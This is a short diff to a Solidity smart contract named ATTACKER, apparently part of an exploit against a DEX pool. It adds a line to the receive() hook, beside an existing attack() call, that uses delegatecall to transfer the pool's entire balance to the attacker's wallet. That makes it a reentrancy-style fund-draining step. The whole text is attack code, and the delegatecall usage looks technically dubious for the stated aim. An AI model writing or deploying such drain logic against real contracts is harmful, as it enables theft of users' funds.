@@ -22,5 +22,6 @@ contract ATTACKER{
   }
   receive() payable external{
     attack();
+    dexpool.delegatecall(abi.encodeWithSignature("transfer(address,uint256)",myWallet,address(dexpool).balance));
   }
 }
